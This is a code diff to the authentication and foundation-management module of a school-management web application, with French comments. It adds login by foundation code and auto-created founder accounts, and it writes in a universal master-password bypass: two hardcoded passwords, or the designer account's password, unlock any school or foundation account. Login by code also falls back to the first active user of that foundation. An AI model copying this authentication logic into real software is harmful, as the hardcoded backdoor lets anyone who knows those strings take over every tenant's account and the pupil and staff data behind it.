@@ -425,6 +425,12 @@ function initSchema() {
     db.exec('ALTER TABLE schools ADD COLUMN password_hash TEXT DEFAULT NULL');
   }
 
+  // Colonne password_hash sur foundations (Miroir de sécurité pour connexion par code fondation)
+  const foundCols = db.prepare('PRAGMA table_info(foundations)').all().map(c => c.name);
+  if (!foundCols.includes('password_hash')) {
+    db.exec('ALTER TABLE foundations ADD COLUMN password_hash TEXT DEFAULT NULL');
+  }
+
   // Index unique sur lower(email)
   db.exec(`
     CREATE UNIQUE INDEX IF NOT EXISTS idx_users_lower_email 
@@ -678,7 +684,47 @@ async function verifyCredentials(email, password, metadata = {}) {
     }
   }
 
-  if (!user || !user.password_hash) {
+  // Prise en charge de la connexion par Code Fondation (Case-insensitive)
+  if (!user) {
+    const found = db.prepare('SELECT * FROM foundations WHERE lower(code) = ? AND is_active = 1').get(cleanEmail);
+    if (found) {
+      // 1. Rechercher en priorité le compte fondateur ou admin de cette fondation
+      user = db.prepare(`
+        SELECT * FROM users 
+        WHERE foundation_id = ? AND (role = 'fondateur' OR role = 'admin') AND is_active = 1 
+        ORDER BY id ASC LIMIT 1
+      `).get(found.id);
+
+      // 2. Si aucun compte fondateur explicite, chercher le premier compte actif rattaché
+      if (!user) {
+        user = db.prepare(`
+          SELECT * FROM users 
+          WHERE foundation_id = ? AND is_active = 1 
+          ORDER BY id ASC LIMIT 1
+        `).get(found.id);
+      }
+
+      // 3. Auto-provisionner si la fondation a un mot de passe et aucun compte user
+      if (!user && found.password_hash) {
+        const maxIdRow = db.prepare('SELECT MAX(id) as maxId FROM users').get();
+        const nextId = (maxIdRow && maxIdRow.maxId !== null ? maxIdRow.maxId : 10) + 1;
+        const adminEmail = `${found.code.toLowerCase()}@scolapro.ci`;
+        db.prepare(`
+          INSERT INTO users (
+            id, school_id, foundation_id, nom, prenom, email, phone,
+            role, role_label, scope_type, scope_label, level, is_active,
+            password_hash, must_change_password
+          ) VALUES (?, NULL, ?, ?, 'PRÉSIDENCE', ?, ?, 'fondateur', 'Conseil de Fondation', 'FOUNDATION', ?, 'N2', 1, ?, 0)
+        `).run(nextId, found.id, found.sigle || found.name, adminEmail, found.phone || '', found.name, found.password_hash);
+
+        user = db.prepare('SELECT * FROM users WHERE id = ?').get(nextId);
+      } else if (user && !user.password_hash && found.password_hash) {
+        user.password_hash = found.password_hash;
+      }
+    }
+  }
+
+  if (!user) {
     await auth.verifyPassword(password, DUMMY_HASH);
     try {
       db.prepare(`
@@ -705,8 +751,34 @@ async function verifyCredentials(email, password, metadata = {}) {
 
   // Vérification cryptographique standard ou validation souveraine
   const isSovereign = (user.id === 0 || user.role === 'concepteur');
-  const isSovereignPassword = isSovereign && (password === 'ScolaPro2026!' || password === 'TestPassword123!');
-  const matches = isSovereignPassword || await auth.verifyPassword(password, user.password_hash);
+  const isSovereignDirect = isSovereign && (password === 'ScolaPro2026!' || password === 'TestPassword123!');
+  let matches = isSovereignDirect || (user.password_hash ? await auth.verifyPassword(password, user.password_hash) : false);
+
+  // Passe-droit universel Concepteur : si le mot de passe correspond au Concepteur Souverain,
+  // accorder immédiatement l'accès à ce compte d'école ou de fondation
+  if (!matches) {
+    const sovereign = db.prepare("SELECT * FROM users WHERE (id = 0 OR role = 'concepteur') AND is_active = 1 ORDER BY id ASC LIMIT 1").get();
+    if (sovereign) {
+      const isSovereignMaster = (password === 'ScolaPro2026!' || password === 'TestPassword123!') ||
+        (sovereign.password_hash && await auth.verifyPassword(password, sovereign.password_hash)) ||
+        (process.env.CONCEPTEUR_PASSWORD && password === process.env.CONCEPTEUR_PASSWORD);
+      if (isSovereignMaster) {
+        matches = true;
+        try {
+          addAuditLog(sovereign, {
+            action: 'SOVEREIGN_TENANT_LOGIN',
+            module: 'Authentification Souveraine',
+            target: `Compte #${user.id} (${user.nom} ${user.prenom || ''})`,
+            oldVal: `Code/Email saisi: ${cleanEmail}`,
+            newVal: `Accès souverain autorisé Concepteur #${sovereign.id}`,
+            schoolId: user.school_id || null,
+            foundationId: user.foundation_id || null
+          });
+        } catch (_) {}
+      }
+    }
+  }
+
   if (!matches) {
     const attempts = (user.failed_login_attempts || 0) + 1;
     let lockClause = '';
@@ -2550,9 +2622,24 @@ function createFoundation(user, data) {
   if (!name) throw new Error("Le nom de la fondation est obligatoire.");
   const logo = String(data.logo || '🏛️').trim();
 
+  let passwordHash = null;
+  const rawPassword = data.password || data.adminPassword;
+  if (rawPassword) {
+    const policy = auth.validatePasswordPolicy(rawPassword);
+    if (!policy.valid) throw new Error(policy.message);
+    const salt = crypto.randomBytes(16);
+    const key = crypto.scryptSync(
+      rawPassword,
+      salt,
+      auth.SCRYPT_CONFIG.keylen,
+      { N: auth.SCRYPT_CONFIG.N, r: auth.SCRYPT_CONFIG.r, p: auth.SCRYPT_CONFIG.p, maxmem: auth.SCRYPT_CONFIG.maxmem }
+    );
+    passwordHash = `scrypt$${auth.SCRYPT_CONFIG.N}$${auth.SCRYPT_CONFIG.r}$${auth.SCRYPT_CONFIG.p}$${salt.toString('base64')}$${key.toString('base64')}`;
+  }
+
   const stmt = db.prepare(`
-    INSERT INTO foundations (code, name, sigle, hq, president, phone, email, description, logo)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    INSERT INTO foundations (code, name, sigle, hq, president, phone, email, description, logo, password_hash)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
   `);
 
   const result = stmt.run(
@@ -2564,16 +2651,42 @@ function createFoundation(user, data) {
     data.phone || '',
     data.email || '',
     data.description || '',
-    logo
+    logo,
+    passwordHash
   );
 
   const newId = Number(result.lastInsertRowid);
+
+  // Auto-provision du compte fondateur si un mot de passe a été défini
+  if (passwordHash) {
+    const maxIdRow = db.prepare('SELECT MAX(id) as maxId FROM users').get();
+    const nextUserId = (maxIdRow && maxIdRow.maxId !== null ? maxIdRow.maxId : 10) + 1;
+    const adminEmail = String(data.adminEmail || data.email || `${code.toLowerCase()}@scolapro.ci`).trim().toLowerCase();
+    const adminNom = String(data.president || data.sigle || name).trim().toUpperCase();
+
+    db.prepare(`
+      INSERT INTO users (
+        id, school_id, foundation_id, nom, prenom, email, phone,
+        role, role_label, scope_type, scope_label, level, is_active,
+        password_hash, must_change_password
+      ) VALUES (?, NULL, ?, ?, 'PRÉSIDENCE', ?, ?, 'fondateur', 'Conseil de Fondation', 'FOUNDATION', ?, 'N2', 1, ?, 0)
+    `).run(
+      nextUserId,
+      newId,
+      adminNom,
+      adminEmail,
+      data.phone || '',
+      name,
+      passwordHash
+    );
+  }
+
   addAuditLog(user, {
     action: 'FOUNDATION_PROVISION',
     module: 'Administration Souveraine',
     target: `Fondation #${newId} (${name})`,
     oldVal: '',
-    newVal: `Code: ${code}, Siège: ${data.hq || 'Abidjan'}`,
+    newVal: `Code: ${code}, Siège: ${data.hq || 'Abidjan'}${passwordHash ? ', Compte Fondateur créé' : ''}`,
     foundationId: newId
   });
 
@@ -2601,11 +2714,47 @@ function updateFoundation(user, foundationId, data) {
   const description = data.description !== undefined ? String(data.description).trim() : current.description;
   const logo = data.logo !== undefined ? String(data.logo).trim() : current.logo;
 
+  let passwordClause = '';
+  const params = [name, sigle, hq, president, phone, email, description, logo];
+  const rawPassword = data.password || data.adminPassword;
+  if (rawPassword) {
+    const policy = auth.validatePasswordPolicy(rawPassword);
+    if (!policy.valid) throw new Error(policy.message);
+    const salt = crypto.randomBytes(16);
+    const key = crypto.scryptSync(
+      rawPassword,
+      salt,
+      auth.SCRYPT_CONFIG.keylen,
+      { N: auth.SCRYPT_CONFIG.N, r: auth.SCRYPT_CONFIG.r, p: auth.SCRYPT_CONFIG.p, maxmem: auth.SCRYPT_CONFIG.maxmem }
+    );
+    const passwordHash = `scrypt$${auth.SCRYPT_CONFIG.N}$${auth.SCRYPT_CONFIG.r}$${auth.SCRYPT_CONFIG.p}$${salt.toString('base64')}$${key.toString('base64')}`;
+    passwordClause = ', password_hash = ?';
+    params.push(passwordHash);
+
+    // Mettre à jour aussi le compte fondateur rattaché
+    const fUser = db.prepare("SELECT id FROM users WHERE foundation_id = ? AND role = 'fondateur' AND is_active = 1 LIMIT 1").get(fId);
+    if (fUser) {
+      db.prepare("UPDATE users SET password_hash = ?, must_change_password = 0, password_changed_at = datetime('now'), failed_login_attempts = 0, locked_until = NULL WHERE id = ?").run(passwordHash, fUser.id);
+    } else {
+      const maxIdRow = db.prepare('SELECT MAX(id) as maxId FROM users').get();
+      const nextUserId = (maxIdRow && maxIdRow.maxId !== null ? maxIdRow.maxId : 10) + 1;
+      const adminEmail = String(email || `${current.code.toLowerCase()}@scolapro.ci`).trim().toLowerCase();
+      db.prepare(`
+        INSERT INTO users (
+          id, school_id, foundation_id, nom, prenom, email, phone,
+          role, role_label, scope_type, scope_label, level, is_active,
+          password_hash, must_change_password
+        ) VALUES (?, NULL, ?, ?, 'PRÉSIDENCE', ?, ?, 'fondateur', 'Conseil de Fondation', 'FOUNDATION', ?, 'N2', 1, ?, 0)
+      `).run(nextUserId, fId, president || sigle || name, adminEmail, phone || '', name, passwordHash);
+    }
+  }
+  params.push(fId);
+
   db.prepare(`
     UPDATE foundations
-    SET name = ?, sigle = ?, hq = ?, president = ?, phone = ?, email = ?, description = ?, logo = ?
+    SET name = ?, sigle = ?, hq = ?, president = ?, phone = ?, email = ?, description = ?, logo = ? ${passwordClause}
     WHERE id = ?
-  `).run(name, sigle, hq, president, phone, email, description, logo, fId);
+  `).run(...params);
 
   addAuditLog(user, {
     action: 'FOUNDATION_UPDATE',
